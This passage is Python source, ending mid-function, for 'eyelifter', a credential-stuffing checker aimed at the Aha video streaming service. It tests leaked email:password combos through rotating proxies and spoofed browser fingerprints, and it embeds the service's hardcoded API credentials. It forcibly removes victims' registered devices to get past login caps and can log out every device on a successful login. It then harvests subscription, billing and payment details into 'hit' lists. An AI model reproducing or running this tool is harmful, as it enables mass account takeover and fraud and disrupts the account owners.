import os
import re
import sys
import json
import time
import uuid
import base64
import random
import string
import hashlib
import threading
import subprocess
import configparser
from datetime import datetime
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed, wait, FIRST_COMPLETED
import urllib3

try:
    from curl_cffi import requests as eyelifter_cffi
    _EYELIFTER_HAVE_CFFI = True
except ImportError:
    _EYELIFTER_HAVE_CFFI = False
    import requests as eyelifter_cffi

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

EYELIFTER = "eyelifter"
EYELIFTER_VER = "v69"
EYELIFTER_YEAR = "2026"

_F1T = "QWhhIFZp"
_F2T = "ZGVvIENoZWNrZXI="
_F1A = "QGV5ZWxp"
_F2A = "ZnRlcg=="
_F1C = "QGRhcmto"
_F2C = "dWNoYW5uZWw="
_F1D = "QUhBX0BleWVsaWZ0ZXI="
_F1G = "VEc6IEBleWVsaWZ0ZXIg"
_F2G = "fCBAZGFya2h1Y2hhbm5lbA=="
_F1S = "bG9ja2VkLWJ5LWV5"
_F2S = "ZWxpZnRlci0yMDI2"

EYELIFTER_SEAL = os.path.join(os.path.expanduser("~"), ".eyelifter.aha.seal")
_EYELIFTER_SEALED = None


def eyelifter_d(e):
    try:
        pad = "=" * (-len(e) % 4)
        return base64.b64decode(e + pad).decode("utf-8")
    except Exception as ex:
        raise SystemExit(f"eyelifter decode: {ex}")


def eyelifter_j(*p):
    return "".join(eyelifter_d(x) for x in p)


EYELIFTER_TOOL      = eyelifter_j(_F1T, _F2T)
EYELIFTER_TG_USER   = eyelifter_j(_F1A, _F2A)
EYELIFTER_TG_CHAN   = eyelifter_j(_F1C, _F2C)
EYELIFTER_RESULTS   = eyelifter_j(_F1D)
EYELIFTER_TAG       = eyelifter_j(_F1G, _F2G)
EYELIFTER_SEAL_STR  = eyelifter_j(_F1S, _F2S)
EYELIFTER_LINE_TAG  = f"by {EYELIFTER_TG_USER} | {EYELIFTER_TG_CHAN}"
EYELIFTER_EXPECTED  = "Aha Video Checker"


def eyelifter_verify(ctx="x"):
    global _EYELIFTER_SEALED
    if _EYELIFTER_SEALED is True:
        return True
    if EYELIFTER_TOOL != EYELIFTER_EXPECTED:
        raise RuntimeError("eyelifter: credit stripped.")
    if EYELIFTER_TG_USER != "@samvir1" or EYELIFTER_TG_CHAN != "@samvir1":
        raise RuntimeError("eyelifter: credit stripped.")
    try:
        fp = hashlib.sha256(open(__file__, "rb").read()).hexdigest()[:32]
    except Exception:
        fp = "x"
    if os.path.isfile(EYELIFTER_SEAL):
        try:
            st = open(EYELIFTER_SEAL).read().strip()
        except OSError:
            st = ""
        if st and st != fp:
            raise RuntimeError("eyelifter: build touched. restore original.")
    else:
        try:
            open(EYELIFTER_SEAL, "w").write(fp)
        except OSError:
            pass
    _EYELIFTER_SEALED = True
    return True


_ANSI = sys.stdout.isatty()
_RS = "\033[0m"


def eyelifter_color(c, s, b=False):
    if not _ANSI:
        return s
    return f"\033[{'1;' if b else ''}{c}m{s}{_RS}"


def eyelifter_vlen(s):
    import unicodedata
    n = 0
    for ch in s:
        if unicodedata.combining(ch):
            continue
        n += 2 if unicodedata.east_asian_width(ch) in ("W", "F") else 1
    return n


def eyelifter_center(t, w):
    vl = eyelifter_vlen(t)
    if vl >= w:
        return t
    l = (w - vl) // 2
    return " " * l + t + " " * (w - vl - l)


_LV = {"SUCCESS": ("32", True), "INFO": ("36", False), "WARN": ("33", True),
       "ERROR": ("31", True), "STEP": ("96", True), "DEBUG": ("35", False)}
_CL = threading.Lock()


def eyelifter_log(emoji, level, tag, msg):
    ts = datetime.now().strftime("%H:%M:%S")
    code, bold = _LV.get(level, ("0", False))
    with _CL:
        if _ANSI:
            print(f"{eyelifter_color('90', ts)} {emoji}  "
                  f"{eyelifter_color(code, f'{level:7s}', bold)}  "
                  f"{eyelifter_color('90', tag)}  {msg}", flush=True)
        else:
            print(f"[{ts}] {emoji} {level:7s} {tag} {msg}", flush=True)


def eyelifter_dbg(tag, msg):
    if not _EYELIFTER_CFG.settings.get("debug", False):
        return
    eyelifter_log("🐛", "DEBUG", tag, f"{msg} [eyelifter]")


def eyelifter_rline(i, t, st, txt, c, bold=False, whole=False):
    with _CL:
        if _ANSI:
            prefix = eyelifter_color("90", f"[{i}/{t}]")
            tag = eyelifter_color(c, st.ljust(6), True if bold else False)
            if whole:
                body = eyelifter_color(c, txt, True if bold else False)
            else:
                body = txt
            print(f"{prefix} {tag} {body}", flush=True)
        else:
            print(f"[{i}/{t}] {st.ljust(6)} {txt}", flush=True)


def eyelifter_section(t, width=62):
    print()
    lbl = f" {t} "
    vl = eyelifter_vlen(lbl)
    side = max(1, (width - vl) // 2)
    print(eyelifter_color("90", "─" * side) +
          eyelifter_color("96", lbl, True) +
          eyelifter_color("90", "─" * (width - vl - side)))


def eyelifter_divider(width=62):
    print(eyelifter_color("90", ("─" if _ANSI else "-") * width))


def eyelifter_banner(title, sub=None, width=62):
    print()
    line = "═" if _ANSI else "="
    print(eyelifter_color("90", line * width))
    print(eyelifter_color("96", eyelifter_center(title, width), True))
    if sub:
        print(eyelifter_color("2", eyelifter_center(sub, width)))
    print(eyelifter_color("5", eyelifter_center(
        f"eyelifter · {EYELIFTER_TG_USER} · {EYELIFTER_TG_CHAN}", width)))
    print(eyelifter_color("90", line * width))


def eyelifter_summary(rows):
    print()
    print(eyelifter_color("96",
        f"═══ eyelifter · {EYELIFTER_TG_USER} · {EYELIFTER_TG_CHAN} ═══", True))
    if not rows:
        return
    wk = max(len(str(k)) for k, _ in rows)
    for k, v in rows:
        print(f"  {eyelifter_color('96', str(k).ljust(wk))}  "
              f"{eyelifter_color('0', str(v))}")
    print(eyelifter_color("96", "════════════════════════════════", True))
    print()


EYELIFTER_CFG_PATH = os.path.join(
    os.environ.get("AHA_HOME") or os.path.dirname(os.path.abspath(__file__)),
    "config_aha.ini"
)
EYELIFTER_MAX_THREADS = 100

EYELIFTER_BASE_REST = "https://rest-prod-aha.evergent.com"
EYELIFTER_BASE_WEB  = "https://www.aha.video"

EYELIFTER_API_USER = "ahaapiuser"
EYELIFTER_API_PASS = "Aha@p!u$#r123#$"

EYELIFTER_UA_POOL = [
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
]

EYELIFTER_IMPERSONATE_POOL = [
    "chrome131_android",
    "chrome99_android",
    "chrome131",
    "chrome124",
    "chrome120",
]


class EyelifterConfig:
    def __init__(self, cf=EYELIFTER_CFG_PATH):
        self.eyelifter = EYELIFTER
        self.config_file = cf
        self.cp = configparser.ConfigParser()
        self.cp.optionxform = str
        self.settings = {}
        self.eyelifter_load()

    def eyelifter_load(self):
        if not os.path.exists(self.config_file):
            self.eyelifter_default()
        try:
            self.cp.read(self.config_file, encoding="utf-8")
        except Exception:
            self.eyelifter_default()
            self.cp.read(self.config_file, encoding="utf-8")
        if "eyelifter" not in self.cp:
            self.cp["eyelifter"] = {}
        c = self.cp["eyelifter"]
        self.settings["threads"] = max(1, min(EYELIFTER_MAX_THREADS, c.getint("threads", 25)))
        self.settings["timeout"] = max(5, min(120, c.getint("timeout", 20)))
        self.settings["proxies_file"] = c.get("proxies_file", "proxies.txt")
        self.settings["retries"] = max(0, min(5, c.getint("retries", 1)))
        self.settings["retry_delay"] = max(0.0, min(60.0, c.getfloat("retry_delay", 0.5)))
        self.settings["combo_delay"] = max(0.0, min(60.0, c.getfloat("combo_delay", 0.0)))
        self.settings["rate_limit_delay"] = max(1, min(120, c.getint("rate_limit_delay", 8)))
        self.settings["skip_proxy_test"] = c.getboolean("skip_proxy_test", False)
        self.settings["open_channel_on_launch"] = c.getboolean("open_channel_on_launch", True)
        self.settings["auto_logout_all_on_hit"] = c.getboolean("auto_logout_all_on_hit", False)
        self.settings["max_device_removals"] = max(1, min(10, c.getint("max_device_removals", 3)))
        self.settings["cp"] = c.get("cp", "AHA_IN").strip() or "AHA_IN"
        self.settings["hit_spacer"] = c.getboolean("hit_spacer", True)
        self.settings["debug"] = c.getboolean("debug", False)

    def eyelifter_default(self):
        self.cp["eyelifter"] = {
            "threads": "25",
            "timeout": "20",
            "proxies_file": "proxies.txt",
            "retries": "1",
            "retry_delay": "0.5",
            "combo_delay": "0.0",
            "rate_limit_delay": "8",
            "skip_proxy_test": "false",
            "open_channel_on_launch": "true",
            "auto_logout_all_on_hit": "false",
            "max_device_removals": "3",
            "cp": "AHA_IN",
            "hit_spacer": "true",
            "debug": "false",
        }
        with open(self.config_file, "w", encoding="utf-8") as f:
            self.cp.write(f)

    def eyelifter_save(self):
        if "eyelifter" not in self.cp:
            self.cp["eyelifter"] = {}
        for k, v in self.settings.items():
            self.cp["eyelifter"][k] = str(v)
        with open(self.config_file, "w", encoding="utf-8") as f:
            self.cp.write(f)


_EYELIFTER_CFG = EyelifterConfig()

_EYELIFTER_SESSION = {
    "logout_all_on_hit": None,
}


def eyelifter_pick_impersonate():
    return random.choice(EYELIFTER_IMPERSONATE_POOL)


def eyelifter_build_session(proxy=None):
    to = _EYELIFTER_CFG.settings["timeout"]
    imp = eyelifter_pick_impersonate()
    if _EYELIFTER_HAVE_CFFI:
        try:
            s = eyelifter_cffi.Session(impersonate=imp, timeout=to)
        except Exception:
            try:
                s = eyelifter_cffi.Session(impersonate="chrome131_android", timeout=to)
            except Exception:
                s = eyelifter_cffi.Session(timeout=to)
    else:
        s = eyelifter_cffi.Session()
    s.verify = False
    s.headers.update({
        "user-agent": random.choice(EYELIFTER_UA_POOL),
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "referer": EYELIFTER_BASE_WEB + "/",
        "origin": EYELIFTER_BASE_WEB,
        "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
    })
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    return s


def eyelifter_device_message(serial=None):
    return {
        "deviceType": "mWeb",
        "modelNo": "chrome",
        "deviceName": "web",
        "serialNo": serial or str(uuid.uuid4()),
        "osVersion": "Android 10",
        "appVersion": "8.0.0",
    }


def eyelifter_parse_proxy(l):
    l = l.strip()
    if not l or l.startswith("#"):
        return None
    if l.startswith(("http://", "https://", "socks4://", "socks5://")):
        return l
    p = l.split(":")
    if len(p) == 4:
        return f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
    if len(p) == 2:
        return f"http://{p[0]}:{p[1]}"
    return None


def eyelifter_load_proxies(path):
    if not path or not os.path.isfile(path):
        return []
    out = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for ln in f:
            p = eyelifter_parse_proxy(ln)
            if p:
                out.append(p)
    return list(dict.fromkeys(out))


def eyelifter_test_proxy(p):
    try:
        kw = {"proxies": {"http": p, "https": p}, "timeout": 8}
        if _EYELIFTER_HAVE_CFFI:
            kw["impersonate"] = eyelifter_pick_impersonate()
        r = eyelifter_cffi.get("https://api.ipify.org?format=json", **kw)
        return r.status_code == 200
    except Exception:
        return False


def eyelifter_filter_proxies(proxies):
    if not proxies:
        return []
    total = len(proxies)
    good = []
    done = [0]
    dead = [0]
    lock = threading.Lock()
    eyelifter_log("🌐", "STEP", "PROXY",
        f"testing {total} proxies [eyelifter]")

    def probe(p):
        ok = eyelifter_test_proxy(p)
        with lock:
            done[0] += 1
            if ok:
                good.append(p)
            else:
                dead[0] += 1
            if done[0] % 20 == 0 or done[0] == total:
                eyelifter_log("🔎", "STEP", "PROXY",
                    f"proxies {done[0]}/{total} — {len(good)} live, {dead[0]} dead [eyelifter]")
        return ok

    with ThreadPoolExecutor(max_workers=min(100, max(1, total))) as ex:
        futs = [ex.submit(probe, p) for p in proxies]
        for f in as_completed(futs):
            try:
                f.result()
            except Exception:
                pass
    return good or proxies


_EYELIFTER_STOP = threading.Event()
_EYELIFTER_LK = threading.Lock()
_EYELIFTER_PK = threading.Lock()
_EYELIFTER_FK = threading.Lock()
_EYELIFTER_IK = threading.Lock()
_EYELIFTER_RL = threading.Lock()

_EYELIFTER_ST = {"checked": 0, "hit": 0, "free": 0, "bad": 0, "locked": 0,
                 "errors": 0, "rl": 0, "pfails": 0, "freed": 0, "logged_out": 0}
_EYELIFTER_START = time.time()
_EYELIFTER_TOTAL = 0
_EYELIFTER_POOL = []
_EYELIFTER_BADP = set()
_EYELIFTER_COOLP = {}
_EYELIFTER_INUSE = set()
_EYELIFTER_RLU = 0.0

_EYELIFTER_HIT_F = None
_EYELIFTER_FREE_F = None
_EYELIFTER_BAD_F = None
_EYELIFTER_LOCKED_F = None
_EYELIFTER_ERR_F = None
_EYELIFTER_FOLDER = None


def eyelifter_reset_stats():
    global _EYELIFTER_ST, _EYELIFTER_START, _EYELIFTER_COOLP, _EYELIFTER_BADP, _EYELIFTER_RLU
    with _EYELIFTER_LK:
        _EYELIFTER_ST = {"checked": 0, "hit": 0, "free": 0, "bad": 0, "locked": 0,
                         "errors": 0, "rl": 0, "pfails": 0, "freed": 0, "logged_out": 0}
        _EYELIFTER_START = time.time()
    with _EYELIFTER_PK:
        _EYELIFTER_COOLP = {}
        _EYELIFTER_BADP = set()
    with _EYELIFTER_RL:
        _EYELIFTER_RLU = 0.0


def eyelifter_pick_proxy(exclude=None):
    now = time.time()
    with _EYELIFTER_PK:
        avail = [p for p in _EYELIFTER_POOL
                 if p not in _EYELIFTER_BADP and _EYELIFTER_COOLP.get(p, 0.0) <= now]
    with _EYELIFTER_IK:
        free = [p for p in avail if p not in _EYELIFTER_INUSE]
    if not free:
        free = avail
    if exclude and len(free) > 1:
        free = [p for p in free if p != exclude] or free
    p = random.choice(free) if free else None
    if p:
        with _EYELIFTER_IK:
            _EYELIFTER_INUSE.add(p)
    return p


def eyelifter_rel_proxy(p):
    if not p:
        return
    with _EYELIFTER_IK:
        _EYELIFTER_INUSE.discard(p)


def eyelifter_bad_proxy(p):
    if not p:
        return
    with _EYELIFTER_PK:
        if p in _EYELIFTER_BADP:
            return
        _EYELIFTER_BADP.add(p)
    with _EYELIFTER_LK:
        _EYELIFTER_ST["pfails"] += 1


def eyelifter_cool_proxy(p, secs=120.0):
    if not p:
        return
    with _EYELIFTER_PK:
        _EYELIFTER_COOLP[p] = time.time() + secs


def eyelifter_sw(fh, text):
    if fh is None:
        return
    with _EYELIFTER_FK:
        try:
            fh.write(text)
            fh.flush()
        except Exception:
            pass


def eyelifter_rl_backoff(s):
    global _EYELIFTER_RLU
    with _EYELIFTER_RL:
        _EYELIFTER_RLU = max(_EYELIFTER_RLU, time.time() + s)


def eyelifter_rl_wait():
    while not _EYELIFTER_STOP.is_set():
        with _EYELIFTER_RL:
            gap = _EYELIFTER_RLU - time.time()
        if gap <= 0:
            return
        if _EYELIFTER_STOP.wait(min(gap, 1.0)):
            return


def eyelifter_post(session, path, body, token=None):
    url = EYELIFTER_BASE_REST + path
    headers = {}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    try:
        r = session.post(url, data=json.dumps(body), headers=headers,
                         timeout=_EYELIFTER_CFG.settings["timeout"])
    except Exception as e:
        return None, None, f"{type(e).__name__}"
    try:
        j = r.json() if r.text else None
    except Exception:
        j = None
    eyelifter_dbg("RESP",
        f"{path} status={getattr(r, 'status_code', '?')} "
        f"len={len(r.text or '')} body={(r.text or '')[:160]}")
    return r, j, None


def eyelifter_fail_info(msg):
    fails = msg.get("failureMessage") or []
    if isinstance(fails, list) and fails:
        f0 = fails[0] or {}
        return f0.get("errorCode") or "", (f0.get("errorMessage") or "")
    return "", (msg.get("message") or "")


def eyelifter_classify_login_err(msg):
    code, emsg = eyelifter_fail_info(msg)
    m = emsg.lower()
    if any(k in m for k in (
        "wrong username or password",
        "incorrect password",
        "invalid password",
        "authentication failed",
        "invalid credential",
        "wrong password",
    )):
        return "wrong_password", emsg
    if any(k in m for k in (
        "no accounts found",
        "user not exist",
        "user does not exist",
        "not registered",
        "no user found",
    )):
        return "user_not_exist", emsg
    if "maximum device" in m or "exceeded maximum" in m:
        return "device_cap", emsg
    if "login limit" in m or "login_limit" in m:
        return "login_limit", emsg
    if "activation code" in m:
        return "activation_required", emsg
    if any(k in m for k in ("account locked", "blocked", "suspended", "disabled",
                            "deactivated", "terminated")):
        return "account_locked", emsg
    if "session" in m:
        return "invalid_session", emsg
    return None, emsg


def eyelifter_parse_device_list(msg):
    devs = msg.get("accountDeviceDetails") or msg.get("AccountDeviceDetails") or []
    out = []
    for d in devs:
        serial = d.get("serialNo")
        if not serial:
            continue
        out.append({
            "serialNo": serial,
            "deviceId": d.get("deviceId"),
            "lastLogin": d.get("lastLoginDate") or 0,
            "model": d.get("modelNo") or "",
            "name": d.get("deviceName") or "",
            "isSession": d.get("isSessionDevice") is True,
        })
    out.sort(key=lambda x: x.get("lastLogin") or 0)
    return out


def eyelifter_login(session, email, password, cp, serial=None):
    body = {
        "GetOAuthAccessTokenv2RequestMessage": {
            "contactUserName": email,
            "contactPassword": password,
            "deviceMessage": eyelifter_device_message(serial),
            "source": "web",
            "channelPartnerID": cp,
            "apiUser": EYELIFTER_API_USER,
            "apiPassword": EYELIFTER_API_PASS,
        }
    }
    r, j, err = eyelifter_post(session, "/aha/getOAuthAccessTokenv2", body)
    if err:
        return None, f"net_{err}"
    if not j:
        return None, "non_json"
    return j.get("GetOAuthAccessTokenv2ResponseMessage") or {}, None


def eyelifter_remove_device(session, cp, serial, challenge=None, bearer=None,
                            cp_customer=None, email=None, account_id=None):
    inner = {
        "channelPartnerID": cp,
        "apiUser": EYELIFTER_API_USER,
        "apiPassword": EYELIFTER_API_PASS,
        "serialNo": serial,
    }
    if challenge:
        inner["token"] = challenge
    if cp_customer:
        inner["cpCustomerID"] = cp_customer
    if email:
        inner["email"] = email
    if account_id:
        inner["accountID"] = account_id

    body = {"RemoveDeviceReqMessage": inner}
    r, j, err = eyelifter_post(session, "/aha/removeDeviceForAccount",
                               body, token=bearer)
    if err or not j:
        return False, err or "no_json"
    msg = j.get("RemoveDeviceResponseMessage") or {}
    if msg.get("responseCode") == "1":
        return True, None
    c, e = eyelifter_fail_info(msg)
    return False, f"{c}:{e[:60]}"


def eyelifter_fetch_profile(session, token):
    body = {
        "GetAccountProfileRequestMessage": {
            "channelPartnerID": "AHA_IN",
            "apiUser": EYELIFTER_API_USER,
            "apiPassword": EYELIFTER_API_PASS,
        }
    }
    r, j, err = eyelifter_post(session, "/aha/getAccountProfile", body, token=token)
    if err or not j:
        return {}
    return j.get("GetAccountProfileResponseMessage") or {}


def eyelifter_fetch_subscription(session, token, cp):
    body = {
        "GetActiveSubscriptionsRequestMessage": {
            "channelPartnerID": cp,
            "apiUser": EYELIFTER_API_USER,
            "apiPassword": EYELIFTER_API_PASS,
        }
    }
    r, j, err = eyelifter_post(session, "/aha/getActiveSubscriptions",
                               body, token=token)
    if err or not j:
        return {}
    msg = j.get("GetActiveSubscriptionsResponseMessage") or {}
    services = msg.get("AccountServiceMessage") or []
    if not services:
        return {}
    s0 = services[0]
    return {
        "plan_name": (s0.get("displayName") or "").strip(),
        "plan_type": (s0.get("subscriptionType") or "").strip(),
        "service_id": s0.get("serviceID") or "",
        "exp_ms": s0.get("validityTill") or 0,
        "start_ms": s0.get("startDate") or 0,
        "price": s0.get("priceCharged") or s0.get("planPrice"),
        "currency": s0.get("currencyCode") or "",
        "payment": s0.get("paymentMethod") or "",
        "is_renewal": bool(s0.get("isRenewal")),
        "is_allow_renewal_consent": bool(s0.get("isAllowRenewalConsent")),
        "renewal_consent_count": int(s0.get("renewalConsentCount") or 0),
        "is_free_trial": bool(s0.get("isInFreeTrail")),
        "cancellable": bool(s0.get("cancellable")),
        "subscription_status": (s0.get("subscriptionStatus") or "").strip(),
        "next_billing_ms": msg.get("nextBillingDateTime") or 0,
        "next_billing_amount": msg.get("nextBillingAmount") or 0,
    }


def eyelifter_fetch_contact_id(session, token, cp):
    body = {
        "GetContactRequestMessage": {
            "channelPartnerID": cp,
            "apiUser": EYELIFTER_API_USER,
            "apiPassword": EYELIFTER_API_PASS,
        }
    }
    r, j, err = eyelifter_post(session, "/aha/getContact", body, token=token)
    if err or not j:
        return "-"
    msg = j.get("GetContactResponseMessage") or {}
    contacts = msg.get("contactMessage") or []
    for c in contacts:
        if c.get("isPrimaryContact") or c.get("main"):
            cid = c.get("contactID")
            if cid:
                return str(cid)
    if contacts:
        return str(contacts[0].get("contactID") or "-")
    return "-"


def eyelifter_classify(profile):
    sub_status   = profile.get("subscriptionStatus")
    sub_exp      = profile.get("subscriptionExpDateTime")
    never_sub    = profile.get("neverSubscribed")
    free_trial   = profile.get("isUserFreeTrial")
    grace        = profile.get("withinGracePeriod")

    reasons = []
    if sub_status is True:
        reasons.append("SubStatus")
    try:
        if sub_exp and int(sub_exp) > 0:
            reasons.append("Active")
    except (ValueError, TypeError):
        pass
    if never_sub is False:
        reasons.append("SubscribedBefore")
    if free_trial == "Y":
        reasons.append("FreeTrial")
    if grace is True:
        reasons.append("GracePeriod")
    return reasons


def eyelifter_logout_all_devices(session, cp, token):
    body = {
        "GetLoggedInDevicesRequestMessage": {
            "channelPartnerID": cp,
            "apiUser": EYELIFTER_API_USER,
            "apiPassword": EYELIFTER_API_PASS,
        }
    }
    r, j, err = eyelifter_post(session, "/aha/getLoggedInDevices", body, token=token)
    devices = []
    if j and not err:
        msg = (j.get("GetLoggedInDevicesRespMessage")
               or j.get("GetLoggedInDevicesResponseMessage") or {})
        devices = eyelifter_parse_device_list(msg)

    if not devices:
        return 0

    removed = 0
    for dev in devices:
        if dev.get("isSession"):
            continue
        ok, _ = eyelifter_remove_device(session, cp, dev["serialNo"],
                                        challenge=None, bearer=token)
        if ok:
            removed += 1
    return removed


def eyelifter_check(combo, proxy=None):
    email, password = combo.split(":", 1)
    email = email.strip()
    password = password.strip()

    session = eyelifter_build_session(proxy)
    serial = str(uuid.uuid4())
    cp = _EYELIFTER_CFG.settings.get("cp", "AHA_IN")

    logout_all = _EYELIFTER_SESSION.get("logout_all_on_hit")
    if logout_all is None:
        logout_all = _EYELIFTER_CFG.settings.get("auto_logout_all_on_hit", False)

    max_rem = _EYELIFTER_CFG.settings.get("max_device_removals", 3)

    login_msg = None
    last_reason = ""
    last_emsg = ""
    cap_attempts = 0

    while cap_attempts < max_rem:
        if _EYELIFTER_STOP.is_set():
            return {"status": "error", "error_type": "stopped",
                    "email": email, "password": password}

        eyelifter_dbg("LOGIN",
            f"cp={cp} email={email} serial={serial[:12]}... try={cap_attempts}")

        msg, err = eyelifter_login(session, email, password, cp, serial=serial)
        if err or not msg:
            last_reason = "net"
            last_emsg = err or "empty"
            break

        rc = msg.get("responseCode")
        eyelifter_dbg("LOGIN", f"cp={cp} rc={rc}")

        if rc == "1" and msg.get("accessToken"):
            login_msg = msg
            break

        reason, emsg = eyelifter_classify_login_err(msg)
        last_reason = reason or ""
        last_emsg = emsg

        if reason == "wrong_password":
            return {"status": "bad", "reason": "wrong_password",
                    "email": email, "password": password, "server_msg": emsg}

        if reason == "user_not_exist":
            return {"status": "bad", "reason": "user_not_exist",
                    "email": email, "password": password, "server_msg": emsg}

        if reason == "activation_required":
            return {"status": "bad", "reason": "activation_required",
                    "email": email, "password": password, "server_msg": emsg}

        if reason == "account_locked":
            return {"status": "locked", "reason": "account_locked",
                    "email": email, "password": password, "server_msg": emsg}

        if reason == "login_limit":
            return {"status": "locked", "reason": "login_limit",
                    "email": email, "password": password, "server_msg": emsg}

        if reason == "device_cap":
            challenge = msg.get("token") or ""
            cp_customer = msg.get("cpCustomerID") or ""
            devices = eyelifter_parse_device_list(msg)
            eyelifter_dbg("DEVICE",
                f"cap hit · {len(devices)} devices · "
                f"cpCust={cp_customer[:12]} challenge={challenge[:14]}")

            if not devices:
                cap_attempts += 1
                continue

            target = None
            for dev in devices:
                if dev.get("isSession"):
                    continue
                target = dev
                break
            if not target:
                target = devices[0]

            ok, rerr = eyelifter_remove_device(
                session, cp, target["serialNo"],
                challenge=challenge, bearer=None,
                cp_customer=cp_customer, email=email,
            )
            if not ok:
                ok, rerr = eyelifter_remove_device(
                    session, cp, target["serialNo"],
                    challenge=None, bearer=None,
                    cp_customer=cp_customer, email=email,
                )
            if not ok:
                ok, rerr = eyelifter_remove_device(
                    session, cp, target["serialNo"],
                    challenge=None, bearer=None,
                    cp_customer=cp_customer, email=email,
                    account_id=msg.get("accountID"),
                )

            if ok:
                with _EYELIFTER_LK:
                    _EYELIFTER_ST["freed"] += 1
                eyelifter_dbg("DEVICE",
                    f"freed {target['serialNo'][:16]} model={target['model']}")
                cap_attempts += 1
                continue

            eyelifter_dbg("DEVICE", f"all removal shapes failed: {rerr}")
            cap_attempts += 1
            continue

        last_reason = reason or "unknown"
        break

    if not login_msg:
        if last_reason == "wrong_password":
            return {"status": "bad", "reason": "wrong_password",
                    "email": email, "password": password}
        if last_reason == "user_not_exist":
            return {"status": "bad", "reason": "user_not_exist",
                    "email": email, "password": password}
        if last_reason == "activation_required":
            return {"status": "bad", "reason": "activation_required",
                    "email": email, "password": password}
        if last_reason == "account_locked":
            return {"status": "locked", "reason": "account_locked",
                    "email": email, "password": password}
        if last_reason == "login_limit":
            return {"status": "locked", "reason": "login_limit",
                    "email": email, "password": password}
        if last_reason in ("device_cap", "device_cap_empty"):
            return {"status": "error", "error_type": "device_cap_unresolved",
                    "email": email, "password": password}
        return {"status": "error", "error_type": "login_failed",
                "email": email, "password": password,
                "message": last_emsg[:80] if last_emsg else ""}

    token = login_msg.get("accessToken") or ""

    profile = {}
    contact_id = "-"
    sub = {}
    with ThreadPoolExecutor(max_workers=3) as mini:
        f_profile = mini.submit(eyelifter_fetch_profile, session, token)
        f_contact = mini.submit(eyelifter_fetch_contact_id, session, token, cp)
        f_subs = mini.submit(eyelifter_fetch_subscription, session, token, cp)
        try:
            profile = f_profile.result(timeout=15) or {}
        except Exception:
            profile = {}
        try:
            contact_id = f_contact.result(timeout=15) or "-"
        except Exception:
            contact_id = "-"
        try:
            sub = f_subs.result(timeout=15) or {}
        except Exception:
            sub = {}

    reasons = eyelifter_classify(profile)

    if reasons and logout_all:
        freed = eyelifter_logout_all_devices(session, cp, token)
        with _EYELIFTER_LK:
            _EYELIFTER_ST["logged_out"] += freed
        eyelifter_dbg("LOGOUT", f"hit · removed {freed} devices")

    exp_ms = sub.get("exp_ms") or int(profile.get("subscriptionExpDateTime") or 0)
    days_left = None
    if exp_ms and exp_ms > 0:
        try:
            delta = (int(exp_ms) - int(time.time() * 1000)) // 86400000
            days_left = delta if delta >= 0 else 0
        except (ValueError, TypeError):
            days_left = None

    auto_renew = bool(sub.get("is_renewal")) or bool(sub.get("is_allow_renewal_consent"))
    next_bill_ms = sub.get("next_billing_ms") or 0

    return {
        "status": "ok",
        "email": email,
        "password": password,
        "contact_id": contact_id,
        "cp": login_msg.get("channelPartnerID") or cp,
        "country": profile.get("countryOfRegistration") or "-",
        "account_status": profile.get("accountStatus") or "-",
        "plan_name": sub.get("plan_name") or "",
        "plan_type": sub.get("plan_type") or "",
        "exp_ms": exp_ms,
        "days_left": days_left,
        "auto_renew": auto_renew,
        "next_bill_ms": next_bill_ms,
        "price": sub.get("price"),
        "currency": sub.get("currency") or "",
        "payment": sub.get("payment") or "",
        "num_devices": profile.get("numDeviceRegistered"),
        "hit_reasons": reasons,
        "paid": bool(reasons),
    }


def eyelifter_fmt_line(u, status, for_file=False):
    tag = {"hit": "HIT", "free": "FREE"}.get(status, "?")
    parts = [f"CID={u.get('contact_id', '-')}"]
    if u.get("cp") and u["cp"] != "-":
        parts.append(f"CP={u['cp']}")
    if u.get("country") and u["country"] != "-":
        parts.append(f"Country={u['country']}")
    if status == "hit":
        if u.get("plan_name"):
            parts.append(f"Plan={u['plan_name']}")
        if u.get("plan_type"):
            parts.append(f"Type={u['plan_type']}")
        exp_ms = u.get("exp_ms")
        days_left = u.get("days_left")
        if exp_ms and exp_ms > 0:
            try:
                dt = datetime.fromtimestamp(int(exp_ms) / 1000)
                date_str = dt.strftime("%Y-%m-%d")
                if days_left is not None:
                    parts.append(f"Exp={date_str} ({days_left}d)")
                else:
                    parts.append(f"Exp={date_str}")
            except (ValueError, TypeError, OSError):
                pass
        auto = "Y" if u.get("auto_renew") else "N"
        auto_str = f"AutoRenew={auto}"
        nb = u.get("next_bill_ms") or 0
        if auto == "Y" and nb and nb > 0:
            try:
                nb_dt = datetime.fromtimestamp(int(nb) / 1000).strftime("%Y-%m-%d")
                auto_str += f" Next={nb_dt}"
            except (ValueError, TypeError, OSError):
                pass
        parts.append(auto_str)
        price = u.get("price")
        currency = u.get("currency") or ""
        if price:
            try:
                parts.append(f"Price={int(float(price))}{currency}")
            except (ValueError, TypeError):
                pass
        if u.get("payment"):
            parts.append(f"Pay={u['payment']}")
    if u.get("num_devices") is not None:
        parts.append(f"Dev={u['num_devices']}")
    if for_file:
        parts.append(EYELIFTER_LINE_TAG)
    return f"{tag} {u['email']}:{u['password']} | " + " | ".join(parts)


def eyelifter_spacer():
    return "\n\n" if _EYELIFTER_CFG.settings.get("hit_spacer", True) else "\n"


def eyelifter_record(combo, result):
    global _EYELIFTER_HIT_F, _EYELIFTER_FREE_F, _EYELIFTER_BAD_F
    global _EYELIFTER_LOCKED_F, _EYELIFTER_ERR_F

    st = result.get("status")
